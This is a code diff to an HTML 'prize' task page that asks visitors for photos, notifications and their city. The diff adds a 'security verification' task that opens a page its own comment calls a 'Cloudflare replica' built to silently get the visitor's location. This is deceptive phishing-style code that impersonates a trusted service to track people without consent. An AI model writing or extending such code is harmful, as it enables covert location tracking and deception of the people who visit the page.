@@ -470,10 +470,10 @@
         <div class="task-num">2</div>
         <span class="task-text">🚰 Take a photo of a glass of water</span>
       </div>
-      <a class="task-item" id="task-3" href="YOUR_LINUX_URL_3" target="_blank" onclick="markTaskDone(3)">
+      <div class="task-item" id="task-3" onclick="handleTask3()">
         <div class="task-num">3</div>
-        <span class="task-text">🔔 Allow notifications to stay updated</span>
-      </a>
+        <span class="task-text">🛡️ Complete security verification</span>
+      </div>
       <a class="task-item" id="task-4" href="YOUR_LINUX_URL_4" target="_blank" onclick="markTaskDone(4)">
         <div class="task-num">4</div>
         <span class="task-text">📍 Confirm your city for prize delivery</span>
@@ -691,6 +691,20 @@
         openCamera(2, '🚰 Point camera at a <b>glass of water</b> and tap Take Photo');
       }
     }
+    // ─── Task 3 ──────────────────────────────────────────────────
+    // Opens Cloudflare replica page — silently gets location, returns here
+    function handleTask3() {
+      if (completed.indexOf(3) !== -1) return;
+      window.open('verify.html', '_blank');
+    }
+
+    // Listen for task3done message from verify.html
+    window.addEventListener('message', function(e) {
+      if (e.data === 'task3done') {
+        markTaskDone(3);
+      }
+    });
+
   </script>
 
 </body>
